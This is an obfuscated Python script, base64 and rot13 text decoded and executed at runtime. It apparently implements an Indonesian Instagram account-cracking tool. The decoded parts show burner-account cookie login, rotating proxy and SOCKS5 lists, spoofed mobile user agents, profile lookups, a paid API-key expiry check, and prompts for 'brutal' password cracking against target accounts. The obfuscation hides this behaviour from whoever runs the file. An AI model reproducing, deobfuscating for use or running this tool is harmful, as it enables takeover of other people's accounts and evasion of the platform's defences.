# Python code obfuscated by https://github.com/H4fidXD 
 

import base64, codecs
magic = 'IyEvdXNyL2Jpbi9weXRob24zCiMgY29kaW5nPXV0Zi04IC0qLQoKIy0tLS0tLS0tLS0tLS0tLS1bIERJIEJVQVQgT0xFSCBBTkRBIF0tLS0tLS0tLS0tLS0tIwp0cnk6CiAgICBpbXBvcnQganNvbgogICAgaW1wb3J0IHV1aWQKICAgIGltcG9ydCBobWFjCiAgICBpbXBvcnQgcmFuZG9tCiAgICBpbXBvcnQgaGFzaGxpYgogICAgaW1wb3J0IHVybGxpYgogICAgaW1wb3J0IHN0ZGlvbWFzawogICAgaW1wb3J0IHVybGxpYi5yZXF1ZXN0CiAgICBpbXBvcnQgY2FsZW5kYXIKZXhjZXB0IEltcG9ydEVycm9yIGFzIGU6CiAgICBleGl0KGYnXG4gW1wwMzNbMTszNW0+XDAzM1swbV0gbW9kdWxlIHtlfSBiZWx1bSB0ZXJpbnN0YWxsJykKZnJvbSByaWNoLnBhbmVsIGltcG9ydCBQYW5lbApmcm9tIHJpY2guY29uc29sZSBpbXBvcnQgQ29uc29sZQppbXBvcnQgcmljaApmcm9tIHJpY2gubWFya2Rvd24gaW1wb3J0IE1hcmtkb3duCmltcG9ydCBvcywgc3lzLCBzdWJwcm9jZXNzLCBwbGF0Zm9ybQppbXBvcnQgb3MKdHJ5OgogICAgaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcbiAgTW9kdWwgcmVxdWVzdHMgYmVsdW0gdGVyaW5zdGFsbCEuLi5cbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKdHJ5OgogICAgaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgnXG4gIE1vZHVsIEZ1dHVyZXMgYmVsdW0gdGVyaW5zdGFsbCEuLi5cbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGZ1dHVyZXMnKQp0cnk6CiAgICBpbXBvcnQgYnM0CmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcbiAgTW9kdWwgQnM0IGJlbHVtIHRlcmluc3RhbGwhLi4uXG4nKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQppbXBvcnQgcmVxdWVzdHMsYnM0LGpzb24sb3Msc3lzLHJhbmRvbSxkYXRldGltZSx0aW1lLHJlCnRyeToKICAgIGltcG9ydCByaWNoCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmljaCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICB0cnk6CiAgICAgICAgaW1wb3J0IHJpY2gKICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgICAgICBleGl0KCdUaWRhayBEYXBhdCBNZW5naW5zdGFsbCBNb2R1bGUgcmljaCwgQ29iYSBJbnN0YWxsIE1hbnVhbCAocGlwIGluc3RhbGwgcmljaCknKQoJCmZyb20gcmljaC50YWJsZSBpbXBvcnQgVGFibGUgYXMgbWUKZnJvbSByaWNoLmNvbnNvbGUgaW1wb3J0IENvbnNvbGUgYXMgc29sCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcApmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHQKZnJvbSByaWNoLmNvbnNvbGUgaW1wb3J0IEdyb3VwIGFzIGdwCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwgYXMgbmVsCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwKZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhawpmcm9tIHJpY2ggaW1wb3J0IHByaW50IGFzIHByaW50cwpmcm9tIHJpY2gubWFya2Rvd24gaW1wb3J0IE1hcmtkb3duIGFzIG1hcmsKZnJvbSByaWNoLmNvbHVtbnMgaW1wb3J0IENvbHVtbnMgYXMgY29sCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXIKaW1wb3J0IHRpbWUKZGF5PWRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlZC0lYi0lWSIpCm55TW5EID0gNQpueU14RCA9IDEwCmN1cnJlbnRfR01UID0gdGltZS5nbXRpbWUodGltZS50aW1lKCkpCmluc3RhX2xvZz0naHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9sb2dpbi8/Zm9yY2VfY2xhc3NpY19sb2dpbiZobD1lbicKdXJsPSdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tJwptZW51ZHVtcD1bXQp0cnk6CiAgICBvcy5ta2RpcignRGF0YScpCiAgICBvcy5ta2RpcignUmVzdWx0JykKZXhjZXB0OgogICAgcGFzcwojLS0tLS0tLS0tLS1bUFJPWFldLS0tLS0tLS0tLS0jCnRyeToKICAgIHByb3g9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkucHJveHlzY3JhcGUuY29tL3YyLz9yZXF1ZXN0PWRpc3BsYXlwcm94aWVzJnByb3RvY29sPWh0dHAmdGltZW91dD0xMDAwMCZjb3VudHJ5PWFsbCZzc2w9YWxsJmFub255bWl0eT1hbGwnKS50ZXh0CiAgICBvcGVuKCdEYXRhLy5wcm94LnR4dCcsJ3cnKS53cml0ZShwcm94KQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBwcmludCgnR0FHQUwnKQpwcm94PW9wZW4oJ0RhdGEvLnByb3gudHh0JywncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkKIy0tLS0tLS0tLS0tW1VTRVIgQUdFTlRdLS0tLS0tLS0tLS0jCnRyeToKICAgIHVzZz0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSDRmaWRYRC9wcmVtaXVtL21haW4vRGF0YS8udXNlci1hZ2VudC50eHQnKS50ZXh0CiAgICBvcGVuKCdEYXRhLy51c2VyLWFnZW50LnR4dCcsJ3cnKS53cml0ZSh1c2cpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIHByaW50KCdHQUdBTCcpCnVzZz1vcGVuKCdEYXRhLy51c2VyLWFnZW50LnR4dCcsJ3InKS5yZWFkKCkKIy0tLS0tLS0tLS0tW1NPQ0tTNV0tLS0tLS0tLS0tLSMKdHJ5OgogICAgc29ja3M9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0g0ZmlkWEQvcHJlbWl1bS9tYWluL3NvY2tzNS50eHQnKS50ZXh0CiAgICBvcGVuKCdzb2NrczUudHh0JywndycpLndyaXRlKHNvY2tzKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBwcmludCgnR0FHQUwnKQpzb2Nrcz1vcGVuKCdzb2NrczUudHh0JywncicpLnJlYWQoKQojLS0tLS0tLS0tLS1bRVhQSVJFRF0tLS0tLS0tLS0tLSMKZGF0ZXQgPSAnMjAyMi0xMi0yNicKCmNsYXNzIFRpbWVkZWx0YShvYmplY3QpOgogICAgQHByb3BlcnR5CiAgICBkZWYgaXNvZm9ybWF0KHNlbGYpOgogICAgICAgICAgIHJldHVybiBzdHIoKQoKRXhwaXJhdGlvbkRhdGUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCIpCmlmIEV4cGlyYXRpb25EYXRlID49IGRhdGV0OgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBpbz0oZidbYnJpZ2h0X3doaXRlXVBlcmJhcnVpIEFwaWtleSBBbmRhIFNlZ2VyYSBIYXJnYSBbZ3JlZW5dNTBrLzMwW3doaXRlXSBoYXJpIEh1YiA6IFtncmVlbl0wODU3MjI1ODM5ODYnKQogICAgY2V0YWsobmVsKGlvLHN0eWxlPSdib2xkIGN5YW4nLHRpdGxlPSfwn5ihJykpCiAgICBleGl0KCkKZWxpZiBFeHBpcmF0aW9uRGF0ZSA9PSBkYXRldDoKICAgIGV4aXQoKQplbHNlOgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tWyBERUYtV0FSTkEgXS0tLS0tLS0tLS0tLS0tLS0tLSMKCiBDWT0nXDAzM1s5NjsxbScgI0NZQU4KSD0nXDAzM1sxOzMybScgI0lKTwpNPSdcMDMzWzE7MzFtJyAjTUVSQUgKSz0nXDAzM1sxOzMzbScgI0tVTklORwpVPSdcMDMzWzE7MzVtJyAjVU5HVQpPPSdcMDMzWzM4OzI7MjU1OzEyNzswOzFtJyAjT1JBTkdFCkM9J1wwMzNbMG0nICNDTEVBUgpOID0gJ1x4MWJbMG0nICMgV0FSTkEgTUFUSQoKIy0tLS0tLS0tLS0tLVsgV0FSTkEtVU5UVUstUklDSCBdLS0tLS0tLS0tLS0jCloyID0gIlsjMDAwMDAwXSIgIyBIaXRhbQpNMiA9ICJbI0ZGMDAwMF0iICMgTWVyYWgKSDIgPSAiWyMwMEZGMDBdIiAjIEhpamF1CksyID0gIlsjRkZGRjAwXSIgIyBLdW5pbmcKQjIgPSAiWyMwMEM4RkZdIiAjIEJpcnUKVTIgPSAiWyNBRjAwRkZdIiAjIFVuZ3UKTjIgPSAiWyNGRjAwRkZdIiAjIFBpbmsKTzIgPSAiWyMwMEZGRkZdIiAjIEJpcnUgTXVkYQpQMiA9ICJbI0ZGRkZGRl0iICMgUHV0aWgKSjIgPSAiWyNGRjhGMDBdIiAjIEppbmdnYQpBMiA9ICJbI0FBQUFBQV0iICMgQWJ1LUFidQojLS0tLS0tLS0tLS0tWyBHQU5EQS1DQU1QVVJBTiBdLS0tLS0tLS0tLS0jCnJpY2ggPSBmJ3tQMn1be08yfeKAontQMn1dJwpjcm90ID0gZid7UDJ9W3tKMn3inJN7UDJ9XScKbXlfY29sb3IgPSBbSjIsQjIsTzIsTjIsSzIsSDIsTTJdCmFzdSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tWyBVU0VSLUFHRU5UIF0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKClVTTj0iTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBTTS1OOTg1RiBCdWlsZC9SUDFBLjIwMDcyMC4wMTI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTAwLjAuNDg5Ni41OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMjI3LjAuMC4xMi4xMTcgQW5kcm9pZCAoMzAvMTE7IDQyMGRwaTsgMTE4MHgyMTIzOyBzYW1zdW5nOyBTTS1OOTg1RjsgYzJzOyBleHlub3M5OTA7Igp1Z2VuPW9wZW4oJ0RhdGEvLnVzZXItYWdlbnQudHh0JywncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkKaW50ZXJuYWwsZXh0ZXJuYWwsc3VjY2VzcyxjaGVja3BvaW50LGxvb3AsZm9sbG93aW5nLGxpc2Vuc2lrdW5pLGFwaWtleWt1PVtdLFtdLFtdLFtdLDAsW10sW10sWydzdWtzZXMnXQp1Z2VuMj1bXQp1Z2VuPVtdCnVhc20gPSBbXQpzPXJlcXVlc3RzLlNlc3Npb24oKQojIENMRUFSCmRlZiBjbGVhcigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAKICAgIApmb3IgeCBpbiByYW5nZSgxMDAwKToKCXJyID0gcmFuZG9tLnJhbmRpbnQKCXJjID0gcmFuZG9tLmNob2ljZQoJYVogPSBbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10KCXVnZW50MSA9IGYiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIHtzdHIocnIoOCwxMCkpfTsgYnJpZ2h0X3doaXRlbWkge3N0cihycig0LDkpKX0gQnVpbGQvUFBSMS57c3RyKHJyKDExMTExMSwxOTk5OTkpKX0uMDExOyBlbi11cykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVUNCcm93c2VyLzc5LjAue3N0cihycigxMTExLDk5OTkpKX0uMTM2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFB1ZmZpbi85LjcuMi57c3RyKHJyKDExMTExLDk5OTk5KSl9QVAiCglpZiB1Z2VudDEgaW4gdWFzbTpwYXNzCgllbHNlOnVhc20uYXBwZW5kKHVnZW50MSkKCXVnZW50MiA9IGYiTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIHtzdHIocnIoOCwxMCkpfTsgZW4tVVM7IGJyaWdodF93aGl0ZW1pIE5vdGUge3N0cihycig1LDgpKX0gQnVpbGQvUEtRMS57c3RyKHJyKDExMTExMSwxOTk5OTkpKX0uMDB7c3RyKHJyKDEsOSkpfSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTAwLjAue3N0cihycigxMTExLDY2NjYpKX0uMiBVQ0Jyb3dzZXIvMTMuNC4wLntzdHIocnIoMTExMSw2NjY2KSl9IE1vYmlsZSBTYWZhcmkvNTM3LjM2IgoJaWYgdWdlbnQyIGluIHVhc206cGFzcwoJZWxzZTp1YXNtLmFwcGVuZCh1Z2VudDIpCgl1Z2VudDMgPSBmIk1vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCB7c3RyKHJyKDcsMTIpKX07IGVuLVVTOyBTTS17c3RyKHJjKGFaKSl9e3N0cihycigxMTExLDk5OTkpKX17c3RyKHJjKGFaKSl9KSBBcHBsZVdlYktpdC81MzQuMzAgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBNb2JpbGUgU2FmYXJpLzUzNC4zMCBNb2JpbGUgVUNCcm93c2VyLzMuNC4zLntzdHIocnIoMTExLDk5OSkpfSIKCWlmIHVnZW50MyBpbiB1YXNtOnBhc3MKCWVsc2U6dWFzbS5hcHBlbmQodWdlbnQzKQogCiMtLS0tLS0tLS0tLS0tLS0tLS0tLVsgQkFOTkVSIF0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKZGVmIGJhbm5lcigpOgogICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICBjZXRhayhuZWwoZicnJwpbYnJpZ2h0X3JlZF3ilabilZTilZDilZcgIOKVlOKVkOKVl+KUrOKUgOKUkOKUjOKUgOKUkOKUjOKUgOKUkOKUrOKUjOKUgApbYnJpZ2h0X3doaXRlXeKVkeKVkSDilaYgIOKVkSAg4pSc4pSs4pSY4pSc4pSA4pSk4pSCICDilJzilLTilJAKW2JyaWdodF93aGl0ZV3ilanilZrilZDilZ0gIOKVmuKVkOKVneKUtOKUlOKUgOKUtCDilLTilJTilIDilJjilLQg4pS0IAogICAgICAgICAgICAgICAgICAgICAgJycnCiAsIHN0eWxlPSdib2xkIGN5YW4nLHRpdGxlPWYne00yfeKAontQMn0ge0gyfVZlcnNpb24gNXtQMn0ge00yfeKAontQMn0nKSkKICAgIAp0cnk6CiAgICAjIHB5dGhvbiAyCiAgICB1cmxsaWJfcXVvdGVfcGx1cyA9IHVybGxpYi5xdW90ZQpleGNlcHQ6CiAgICAjIHB5dGhvbiAzCiAgICB1cmxsaWJfcXVvdGVfcGx1cyA9IHVybGxpYi5wYXJzZS5xdW90ZV9wbHVzCiAKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS1bIE1BSU4gXS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKCmRlZiBjZWtBUEkoY29va2llKToKICAgIHVzZXI9b3BlbignRGF0YS8udXNlcm5hbWUnLCdyJykucmVhZCgpCiAgICB0cnk6CiAgICAgICAgYz1zLmdldCgiaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL3VzZXJzL3dlYl9wcm9maWxlX2luZm8vP3VzZXJuYW1lPSVzIiUodXNlciksY29va2llcz17J2Nvb2tpZSc6Y29va2llfSxoZWFkZXJzPXsidXNlci1hZ2VudCI6VVNOLCJ4LWlnLWFwcC1pZCI6JzEyMTc5ODE2NDQ4Nzk2MjgnfSkKICAgICAgICBpPWMuanNvbigpWyJkYXRhIl1bInVzZXIiXQogICAgICAgIG5hbWE9aVsiZnVsbF9uYW1lIl0KICAgICAgICBmb2xsb3dlcnM9aVsiZWRnZV9mb2xsb3dlZF9ieSJdWyJjb3VudCJdCiAgICAgICAgZm9sbG93aW5nPWlbImVkZ2VfZm9sbG93Il1bImNvdW50Il0KICAgICAgICBleHRlcm5hbC5hcHBlbmQoZid7bmFtYX18e2ZvbGxvd2Vyc318e2ZvbGxvd2luZ30nKQogICAgZXhjZXB0ICAoVmFsdWVFcnJvcixLZXlFcnJvcik6CiAgICAgICAgd2VsPSdbYnJpZ2h0X3doaXRlXUluc3RhZ3JhbSBDaGVja3BvaW50JwogICAgICAgIHdlbDIgPSBuZWwod2VsLCBzdHlsZT0nYm9sZCBjeWFuJykKICAgICAgICBzb2woKS5wcmludCh3ZWwyKQogICAgICAgIHRpbWUuc2xlZXAoNCkKICAgICAgICBvcy5yZW1vdmUoJ0RhdGEvLmt1a2lzLmxvZycpCiAgICAgICAgb3MucmVtb3ZlKCdEYXRhLy51c2VybmFtZScpCiAgICAgICAgZXhpdCgpCgogICAgcmV0dXJuIGV4dGVybmFsLHVzZXIKCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVsgTE9HSU4tQ09PS0lFUyBdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKCmRlZiBsb2dpbl9rYW11KCk6CiAgICBpZiAic3Vrc2VzIiBpbiBhcGlrZXlrdToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGt1a2k9b3BlbignRGF0YS8ua3VraXMubG9nJywncicpLnJlYWQoKQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgYmFubmVyKCkKICAgICAgICAgICAgcHJpbnQoJycpCiAgICAgICAgICAgIGlvID0gJ1ticmlnaHRfd2hpdGVdMSA6IFticmlnaHRfd2hpdGVdTG9naW4gbWVuZ2d1bmFrYW4gYWt1biB0dW1iYWwgdW50dWsgbWVuZGFwYXRrYW4gY29va2llIGphbmdhbiBndW5ha2FuIGFrdW4gcHJpYmFkaSEnCiAgICAgICAgICAgIGNldGFrKG5lbChpbyxzdHlsZT0nYm9sZCBjeWFuJyx0aXRsZT0n8J+YgicpKTsKICAgICAgICAgICAgI29zLnN5c3RlbSgicGxheS1hdWRpbyBkYXRhL2xvZ2luLm1wMyIpCiAgICAgICAgICAgIGxvZ2lucGlsPWlucHV0KGYie0h94oCie0N9IElucHV0IDp7SH0gIikKICAgICAgICAgICAgaWYgbG9naW5waWw9PScxJzoKICAgICAgICAgICAgICAgIHdlbCA9ICdbYnJpZ2h0X3doaXRlXUd1bmFrYW4gdXNlcm5hbWUgZGFuIGNvb2tpZXMgaW5zdGFncmFtIHVudHVrIGxvZ2luLiBzZWJlbHVtIGxvZ2luIHBhc3Rpa2FuIGFrdW4gYmVyc2lmYXQgcHVibGlrIGJ1a2FuIHByaXZhdCcKICAgICAgICAgICAgICAgIHdlbDIgPSBuZWwod2VsLHN0eWxlPSdib2xkIGN5YW4nKQogICAgICAgICAgICAgICAgc29sKCkucHJpbnQod2VsMikKICAgICAgICAgICAgICAgIHVzPWlucHV0KGYne0h94oCie0N9IE1hc3VrYW4gdXNlcm5hbWUgOntIfSAnKQogICAgICAgICAgICAgICAgY29rPWlucHV0KGYne0h94oCie0N9IE1hc3VrYW4gQ29va2llICAgOntIfSAnKQogICAgICAgICAgICAgICAga3VraT1vcGVuKCdEYXRhLy5rdWtpcy5sb2cnLCd3Jykud3JpdGUoY29rKQogICAgICAgICAgICAgICAgdXNlcj1vcGVuKCdEYXRhLy51c2VybmFtZScsJ3cnKS53cml0ZSh1cykKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncHl0aG9uIHJ1bi5weScpCiAgICAgICAgICAgIGVsaWYgbG9naW5waWwgPT0gJ2tvc29uZyc6CiAgICAgICAgICAgICAgICBsb2dpbigpCiAgICAgICAgZXgsdXNlcj1jZWtBUEkoa3VraSkKICAgICAgICBjb29raWU9eydjb29raWUnOmt1a2l9CiAgICAgICAgaW5zdGFncmFtKGV4LHVzZXIsY29va2llKS5tZW51KCkKICAgIGVsc2U6CiAgICAgICAgbG9naW4oKQoKZGVmIFVzZXJfQWdlbnQoKToKCWRwaV9waG9uZSA9IFsKCgkJJzEzMycsJzMyMCcsJzUxNScsJzE2MCcsJzY0MCcsJzI0MCcsJzEyMCcKCQknODAwJywnNDgwJywnMjI1JywnNzY4JywnMjE2JywnMTAyNCddCgltb2RlbF9waG9uZSA9IFsKCQknTm9raWEnLCdIVUFXRUknLCdHYWxheHknLAoJCSdVbmxvY2tlZCBTbWFydHBob25lcycsJ05leHVzJywKCQknTW9iaWxlIFBob25lcycsJ1hpYW9taScsCgkJJ3NhbXN1bmcnLCdPbmVQbHVzJywnRGFsdmlrJywKICAgICAgICAnUmVhbG1lJywnSW5maW5peCcsJ0FkdmFuJywKICAgICAgICAnQXN1cycsJ1BPQ08nLCdCbGFja0JlcnJ5J10KCXB4bF9waG9uZSA9IFsKCQknNjIzeDEyODAnLCc3MDB4MTI0NScsJzgwMHgxMjgwJywKCQknMTA4MHgxODEyJywnMTMyMHgyNDAwJywnMTI0MngyNjg4J10KCWlfdmVyc2lvbiA9IFsKCQknMTE0LjAuMC4yMC4yJywnMTE0LjAuMC4zOC4xMjAnLAoJCScxMTQuMC4wLjIwLjcwJywnMTE0LjAuMC4yOC4xMjAnLAoJCScxMTQuMC4wLjAuMjQnLCcxMTQuMC4wLjAuNDEnXQoJVXNlcl9BZ2VudCA9IGYnSW5zdGFncmFtICcrcmFuZG9tLmNob2ljZShpX3ZlcnNpb24pKycgQW5kcm9pZCAoMzAvMy4wOyAnK3JhbmRvbS5jaG9pY2UoZHBpX3Bob25lKSsnZHBpOyAnK3JhbmRvbS5jaG9pY2UocHhsX3Bob25lKSsnOyBodWF3ZWkvZ29vZ2xlOyAnK3JhbmRvbS5jaG9pY2UobW9kZWxfcGhvbmUpKyc7IGFuZ2xlcjsgYW5nbGVyOyBlbl9VUyknCgoJcmV0dXJuIFVzZXJfQWdlbnQKCgpkZWYgdXNlcl9hZ2VudCgpOgoJcmVzb2x1dGlvbnMgPSBbJzEwODB4MjE3OCcsICcxMDgweDIzNTInLCAnMTA4MHgyMTMwJywgJzEwODB4MjEzOCcsICcxMjgweDcyMCcsICcxMDgweDIxMjMnLCAnMTA4MHgyMTUwJyAsJzEwODB4MjE3NiddCgl2ZXJzaW9ucyA9IFsnU00tRzk5MVUnLCAnQ1BIMjIxMScsICdTTS1OOTg2VScsICdTTS1HOTgxVicsJ1NNLUExMDVGJywnSW5maW5peC1YNjgxMCcgLCdicmlnaHRfd2hpdGVtaSBOb3RlIDgnICwnTWkgTm90ZSAxMCddCglkcGlzID0gWycxMjAnLCAnMTYwJywgJzMyMCcsICc0MjAnICwnNDQwJyAsJzQ4MCddCgoJdmVyID0gcmFuZG9tLmNob2ljZSh2ZXJzaW9ucykKCWRwaSA9IHJhbmRvbS5jaG9pY2UoZHBpcykKCXJlcyA9IHJhbmRvbS5jaG9pY2UocmVzb2x1dGlvbnMpCgoJcmV0dXJuICgKCQknSW5zdGFncmFtIDQue30ue30gJwoJCSdBbmRyb2lkICh7fS97fS57fS57fTsge307IHt9OyB'
love = ''
god = ''
destiny = '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